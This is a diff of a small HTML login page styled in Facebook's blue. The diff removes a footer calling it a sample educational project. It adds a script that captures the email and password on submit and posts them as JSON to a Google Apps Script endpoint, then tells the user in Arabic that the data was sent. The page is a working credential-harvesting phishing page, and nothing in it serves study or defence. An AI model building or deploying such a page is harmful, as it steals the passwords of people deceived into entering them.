@@ -1,70 +1,87 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Login Page</title>
+  <title>Login</title>
   <style>
     body {
-      margin: 0;
-      padding: 0;
-      background-color: #f0f2f5;
       font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
     }
-    .container {
-      width: 90%;
-      max-width: 400px;
-      margin: 60px auto;
-      padding: 30px 20px;
-      background: white;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    .login-container {
+      background-color: #fff;
+      padding: 40px;
       border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      width: 300px;
     }
-    h2 {
-      color: #1877f2;
+    .login-container h2 {
       text-align: center;
-      font-size: 28px;
+      color: #1877f2;
+      margin-bottom: 20px;
     }
-    input[type="text"], input[type="password"] {
+    .login-container input {
       width: 100%;
-      padding: 14px;
-      margin: 10px 0;
-      box-sizing: border-box;
-      border-radius: 6px;
-      border: 1px solid #ccc;
-      font-size: 16px;
+      padding: 10px;
+      margin: 8px 0;
+      border: 1px solid #ddd;
+      border-radius: 4px;
     }
-    button {
+    .login-container button {
       width: 100%;
-      padding: 14px;
+      padding: 10px;
       background-color: #1877f2;
       color: white;
       border: none;
-      border-radius: 6px;
-      font-size: 18px;
+      border-radius: 4px;
+      font-weight: bold;
       cursor: pointer;
+      margin-top: 10px;
     }
-    button:hover {
-      background-color: #145dbf;
-    }
-    .footer {
-      text-align: center;
-      margin-top: 20px;
-      color: gray;
-      font-size: 12px;
+    .login-container button:hover {
+      background-color: #155dbe;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Login</h2>
-    <form action="https://formspree.io/f/xeogbvzj" method="POST">
-      <input type="text" name="username" placeholder="Email or phone number" required>
-      <input type="password" name="password" placeholder="Password" required>
+  <div class="login-container">
+    <h2>Log In</h2>
+    <form id="login-form">
+      <input type="email" name="email" placeholder="Email address" required />
+      <input type="password" name="password" placeholder="Password" required />
       <button type="submit">Log In</button>
     </form>
-    <div class="footer">This is a sample educational project only</div>
   </div>
+
+  <script>
+    const form = document.getElementById('login-form');
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+      const formData = {
+        email: form.email.value,
+        password: form.password.value
+      };
+      fetch('https://script.google.com/macros/s/AKfycbxIyA9AibUMRQ__shLek6Rk8uR0Kmne7JdQ6brCeVICUGfYRc9xZnLKMQu_T5z0egRf6A/exec', {
+        method: 'POST',
+        body: JSON.stringify(formData),
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      })
+      .then(res => res.text())
+      .then(data => {
+        alert("تم إرسال البيانات بنجاح");
+        form.reset();
+      })
+      .catch(err => {
+        alert("حدث خطأ: " + err.message);
+      });
+    });
+  </script>
 </body>
 </html>
